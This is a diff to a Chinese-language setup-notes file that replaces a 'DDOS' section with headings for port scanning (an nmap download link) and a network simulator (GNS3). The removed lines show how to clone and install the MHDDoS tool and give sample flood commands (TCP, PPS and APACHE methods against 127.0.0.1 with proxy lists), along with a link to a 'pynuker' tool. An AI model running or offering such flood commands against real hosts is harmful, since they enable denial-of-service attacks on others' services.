@@ -1,29 +1,7 @@
-# DDOS
+# 端口扫描
 安装nmap
 https://nmap.org/download.html#windows
-
-安装git
-https://git-scm.com/download/win
-
-安装环境
-```bash
-git clone https://github.com/MatrixTM/MHDDoS.git
-cd MHDDoS
-pip install -r requirements.txt
-```
-例子
-```bash
-apt install screen -y;
-screen -S ok;
-python start.py TCP 127.0.0.1:80 130 100000
-python start.py TCP 127.0.0.1:80 130 100000
-python start.py PPS http://127.0.0.1/ 1 500 proxy.txt 1500 100000
-python start.py APACHE http://127.0.0.1/ 1 500 proxy.txt 1500 100000
-```
-CTRL+A+D退出
-
-https://sourceforge.net/projects/pynuker/
-
+# 网络模拟器
 https://sourceforge.net/projects/gns-3/
 # 系统更新
 Debian12更新系统
